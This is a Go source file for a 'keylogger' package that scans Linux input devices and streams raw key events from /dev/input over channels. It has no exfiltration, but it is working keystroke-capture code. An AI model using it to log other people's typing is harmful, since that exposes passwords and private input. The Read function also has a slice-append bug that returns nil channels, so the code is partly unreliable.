// Package keylogger is a simple 0 dependency keylogger package
package keylogger

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"strings"
)

const (
	inputPath  = "/sys/class/input/event%d/device/name"
	deviceFile = "/dev/input/event%d"
)

// KeyLogger keeps a reference to the InputDevices that it's listening to.
type KeyLogger struct {
	inputDevices []*InputDevice
}

// NewKeyLogger creates a new keylogger for a set of devices, based on their name.
func NewKeyLogger(deviceName string) *KeyLogger {
	devs := scanDevices(deviceName)
	return &KeyLogger{
		inputDevices: devs,
	}
}

// GetDevices returns the devices that have been found
func (kl *KeyLogger) GetDevices() []*InputDevice {
	return kl.inputDevices
}

// scanDevices gets the desired input device, or returns all of them if no device name is sent.
func scanDevices(deviceName string) []*InputDevice {
	var devs []*InputDevice
	deviceName = strings.ToLower(deviceName)
	retrycount := 0

	for i := 0; i < 255; i++ {
		buff, err := os.ReadFile(fmt.Sprintf(inputPath, i))
		if errors.Is(err, fs.ErrNotExist) {
			// File doesn't exist, there could be other files/devices further up, increase the retry count.
			retrycount++
			if retrycount > 15 {
				// We've retried 15 times, there probably aren't any other devices connected.
				break
			}
			continue
		}
		if err != nil {
			fmt.Printf("can't read input device file: %v\n", err)
			break
		}
		dev := newInputDevice(buff, i)

		if deviceName == "" {
			devs = append(devs, dev)
			continue
		}

		contains := strings.Contains(strings.ToLower(dev.Name), deviceName)
		if deviceName == dev.Name || contains {
			devs = append(devs, dev)
		}
	}

	return devs
}

// Read the devices' input events and send them on their respective channels.
func (kl *KeyLogger) Read() ([]chan InputEvent, error) {
	chans := make([]chan InputEvent, len(kl.inputDevices))

	for _, dev := range kl.inputDevices {
		fd, err := os.Open(fmt.Sprintf(deviceFile, dev.ID))
		if err != nil {
			return nil, fmt.Errorf("error opening device file: %w", err)
		}
		c := make(chan InputEvent)
		go processEvents(fd, c)
		chans = append(chans, c)
	}
	return chans, nil
}

func processEvents(fd *os.File, c chan InputEvent) {
	tmp := make([]byte, eventSize)
	event := InputEvent{}
	for {
		n, err := fd.Read(tmp)
		if err != nil {
			close(c)
			fd.Close()
			panic(err) // don't think this is right here
		}
		if n <= 0 {
			continue
		}

		if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
			panic(err) // again, not right
		}

		c <- event
	}
}
